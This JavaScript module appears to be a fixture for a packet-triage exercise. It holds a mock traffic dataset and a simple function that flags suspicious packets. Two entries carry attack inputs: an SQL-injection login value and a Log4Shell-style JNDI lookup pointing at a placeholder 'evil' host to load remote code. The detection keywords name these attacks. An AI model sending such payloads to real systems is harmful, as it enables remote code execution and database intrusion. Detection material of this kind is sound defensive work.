const packetDataset = [
  { id: 1, src: "192.168.1.12", dst: "10.0.0.1", protocol: "DNS", length: 78, info: "A query portal.internal" },
  { id: 2, src: "172.16.4.21", dst: "192.168.1.5", protocol: "TCP", length: 64, info: "SYN 445 -> possible SMB" },
  { id: 3, src: "10.1.8.5", dst: "172.20.11.21", protocol: "TCP", length: 60, info: "SYN, ACK 445" },
  { id: 4, src: "198.51.100.15", dst: "192.168.1.30", protocol: "HTTP", length: 512, info: "POST /login username=admin'--" },
  { id: 5, src: "192.168.1.30", dst: "198.51.100.15", protocol: "HTTP", length: 220, info: "500 SQL syntax error" },
  { id: 6, src: "203.0.113.50", dst: "172.19.2.10", protocol: "UDP", length: 68, info: "NTP amplification pattern" },
  { id: 7, src: "100.64.11.44", dst: "8.8.8.8", protocol: "TCP", length: 74, info: "SYN 3389 external source" },
  { id: 8, src: "172.31.9.9", dst: "192.168.50.99", protocol: "TCP", length: 1400, info: "Malformed segment checksum" },
  { id: 9, src: "203.0.113.71", dst: "10.10.2.17", protocol: "HTTP", length: 390, info: "${jndi:ldap://evil/exp}" },
  { id: 10, src: "192.168.20.22", dst: "1.1.1.1", protocol: "DNS", length: 92, info: "TXT query suspicious-domain.tld" },
  { id: 11, src: "172.22.0.18", dst: "203.0.113.33", protocol: "UDP", length: 1450, info: "High-volume UDP burst" },
  { id: 12, src: "10.55.10.61", dst: "172.24.4.35", protocol: "TCP", length: 66, info: "FIN scan packet" },
];

function isSuspicious(packet) {
  const suspiciousPorts = [445, 3389];
  const hasSuspiciousPort = suspiciousPorts.some((p) => packet.info.includes(String(p)));
  const malformed = /malformed|checksum|jndi|sql syntax/i.test(packet.info);
  return hasSuspiciousPort || malformed || packet.length > 1400;
}

module.exports = { packetDataset, isSuspicious };
